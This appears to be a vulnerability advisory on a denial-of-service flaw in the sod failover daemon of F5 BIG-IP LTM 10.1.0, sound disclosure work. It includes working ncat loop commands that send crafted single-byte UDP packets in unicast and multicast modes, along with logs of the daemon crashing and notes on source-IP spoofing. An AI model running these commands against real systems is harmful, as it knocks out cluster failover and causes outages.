Summary of the issue
--------------------

Attack can be performed by sending crafted UDP packets directed to _sod_ daemon
listening on particular interface and port of BIG-IP LTM VE instance.

In well designed networks where Network Failover is configured to run on
dedicated, isolated networks attack surface is limited and requires attacker to
have direct access to particular network.

Attack requires attacker to acquire basic information about network design in
order to be successful. It seems plausible that all those information can be
bruteforced in case no knowledge of attacked network is assumed. Additionally
some values are suggested as default in documentation and configuration (_sod_
ports for unicast and multicast mode, IP for multicast mode).

Due to the fact that no two-way communication is required for attack to be
successful attacker may spoof source IP when attacking service in unicast mode.
This may indicate that there's no requirement for attacker to have direct access
to network in which _sod_ service is running. This however heavily depends on
other network security measures that may be implemented.

It should be also noted that vendor suggests running Network Failover/_sod_
service on dedicated, isolated VLAN.

Technical details
-----------------

**Unicast mode**

It has been observed that it's possible to crash/cause restart of _sod_ service by
sending crafted UDP packets. Packets need to conform to following rules:

* source IP should be set to valid peer self IP address
* destination IP should be set to self IP of attacked device
* destination UDP port should be set to port on which _sod_ service is listening
* payload of UDP should contain single byte value - meaningful results have been
achieved using "\x01" and "\0x41"

Presented points can be satisfied by running following Bash command from
attacker's machine:

```shell
while (true); do printf "\x01" | ncat --send-only -nvu 10.1.70.10 8900; sleep 1;
done
```
Important prerequisite is that attacker's machine must be configured with IP
equal to self IP of peers machine. As no two-way communication is expected here
source IP address can be easily spoofed. Referenced Ruby script (f5-soddos.rb)
allows for easy spoofing of IP source address and doesn't require reconfiguring
of network adapter.

When above command is run _sod_ deamon will start crashing/restarting giving
similar console output on attacked machine:

```
[root@BIGIP-1:Active] config # Feb 16 00:15:18 local/BIGIP-1 emerg logger:
Re-starting sod
Feb 16 00:15:20 local/BIGIP-1 emerg logger: Re-starting sod

[root@BIGIP-1:Offline] config # Feb 16 00:15:21 local/BIGIP-1 emerg logger: 
Re-starting sod
Feb 16 00:15:22 local/BIGIP-1 emerg logger: Re-starting sod
Feb 16 00:15:23 local/BIGIP-1 emerg logger: Re-starting sod
Feb 16 00:15:24 local/BIGIP-1 emerg logger: Re-starting sod

[root@BIGIP-1:Standby] config #
[root@BIGIP-1:Active] config #
```

Due to failure of service vital to operation of cluster switchover standby
device won't assume Active status.

**Multicast mode**

Most of the rules are not changed for multicast mode. The main difference for
attack to be successful is that in multicast mode source IP of crafted packets
may be random (doesn't need to match self IP of peer device).

In order to perform attack in network where _sod_ is running in multicast mode
following command can be used:

```shell
while (true); do printf "\x01" | ncat --send-only -nvu 224.0.0.245 62960;
sleep 1; done
```

Results of such command are very similar to those in unicast mode. There's one
difference however - due to multicast operation both instances can be attacked
with single packet.

Affected versions
-----------------

Only F5 BIG-IP LTM version tested was the one available on F5 trial software
site: Version 10.1.0 Build 3341.1084

It can be assumed that earlier versions may be affected as well.

According to vendor _sod_ daemon present on version 11.1 and above is patched
and not affected by presented issue.
